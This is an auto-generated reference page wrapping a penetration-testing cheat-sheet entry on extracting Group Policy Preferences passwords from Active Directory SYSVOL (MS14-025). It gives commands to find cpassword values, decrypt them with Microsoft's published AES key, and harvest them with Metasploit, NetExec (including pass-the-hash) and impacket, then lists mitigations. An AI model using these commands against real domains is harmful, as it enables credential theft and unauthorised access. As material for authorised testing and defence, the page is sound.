---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - Group Policy Preferences

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-group-policy-preferences` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-group-policy-preferences.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - Group Policy Preferences](../../topics/active-directory/password-group-policy-preferences.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-group-policy-preferences |
| name | Password - Group Policy Preferences |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-group-policy-preferences.md |

## Preserved Source Material

````yaml
_body: "# Password - Group Policy Preferences\n\nFind passwords in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active\
  \ Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\\\<DOMAIN>\\\
  SYSVOL\\<DOMAIN>\\Policies\\`.\n\n```powershell\nfindstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml\n```\n\
  \nDecrypt a Group Policy Password found in SYSVOL (by [0x00C651E0](https://twitter.com/0x00C651E0/status/956362334682849280)),\
  \ using the 32-byte AES key provided by Microsoft in the [MSDN - 2.2.1.1.4 Password Encryption](https://msdn.microsoft.com/en-us/library/cc422924.aspx)\n\
  \n```bash\necho 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\
  \ -iv 0000000000000000\n\ne.g: \necho '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc\
  \ -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\necho 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'\
  \ | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\
  ```\n\n## Automate the SYSVOL and passwords research\n\n* `Metasploit` modules to enumerate shares and credentials\n\n \
  \   ```c\n    scanner/smb/smb_enumshares\n    post/windows/gather/enum_shares\n    post/windows/gather/credentials/gpp\n\
  \    ```\n\n* NetExec modules\n\n    ```powershell\n    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin\n\
  \    nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password\n    ```\n\n* [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)\n\
  \n  ```powershell\n  # with a NULL session\n  Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n\n  # with cleartext credentials\n\
  \  Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n\n  # pass-the-hash\n  Get-GPPPassword.py -hashes\
  \ 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n  ```\n\n## Mitigations\n\n* Install [KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)\
  \ on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.\n\
  * Delete existing GPP xml files in SYSVOL containing passwords.\n* Don’t put passwords in files that are accessible by all\
  \ authenticated users.\n\n## References\n\n* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)"
_relative_path: active-directory/pwd-group-policy-preferences.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-group-policy-preferences.md
````
